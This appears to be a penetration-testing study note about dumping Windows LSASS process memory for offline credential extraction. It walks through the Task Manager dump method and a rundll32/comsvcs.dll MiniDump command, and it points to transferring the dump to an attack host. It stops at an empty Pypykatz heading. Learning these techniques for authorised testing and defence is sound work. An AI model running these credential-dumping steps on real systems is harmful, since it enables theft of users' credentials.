
Reference the lessons on LSASS in [[Credential Storage#LSASS]] 




### Dumping LSASS Process Memory

>[! Note ] 
>Best to create a copy of the contents of LSASS process memory via a memory dump. This allows to extract credentials offline 

#### Task Manager Method:

`Open Task Manager` > `Select the Processes tab` > `Find & right click the Local Security Authority Process` > `Select Create dump file`

- The above creates a file called `lsass.DMP` and is located in:
```cmd-session
C:\Users\loggedonusersdirectory\AppData\Local\Temp
```
- Transfer `lsass.DMP` to the attack host via [[Attacking SAM#Syntax for smbserver.py]]


#### Rundll32.exe & Comsvcs.dll Method:

>[! Warning] Warning about this dumping method:
> Modern anti-virus will flag this action as malicious!

1) Determine the process ID assigned to lsass.exe in cmd or powershell

##### Find LSASS PID via CMD
```cmd
tasklist /svc
```

##### Find LSASS PID via Powershell
```powershell
Get-Process lsass
```

#### Creating lsass.dmp via Powershell

>[! Hint]
> Be sure to run powershell as admin

```powershell
PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```
	- rundll32.exe calls cmsvcs.dll 
	- which then calls MiniDump to dump LSASS process memory to the intended directory


### Extract Credentials via Pypykatz:



